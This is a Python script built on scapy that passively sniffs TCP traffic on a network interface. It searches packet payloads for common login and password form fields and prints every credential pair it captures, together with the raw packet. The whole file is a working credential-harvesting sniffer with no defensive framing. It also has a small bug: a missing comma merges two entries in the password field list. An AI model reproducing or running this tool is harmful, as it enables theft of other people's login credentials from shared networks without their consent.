from scapy.all import *
from urllib import parse
import re

iface = 'eth0'

def search_for_cred(body):
    uname = None
    passwd = None

    usernames = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passwords = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for username in usernames:
        user_name = re.search('(%s=[^&]+)' % username, body, re.IGNORECASE)
        if user_name:
            uname = user_name.group()
            # return uname
    for password in passwords:
        passwds = re.search('(%s=[^&]+)' % password, body, re.IGNORECASE)
        if passwds:
            passwd = passwds.group()
            # return passwd

    if uname and passwd:
        return (uname, passwd)

def parsed_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        credentials = search_for_cred(body)
        if credentials != None:
            print(parse.unquote(credentials[0]))
            print('\n')
            print(parse.unquote(credentials[1]).strip("'"))
            print('\n')
            print(packet[TCP].payload)
    else:
        pass

try:
    sniff(iface=iface, prn=parsed_packet, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)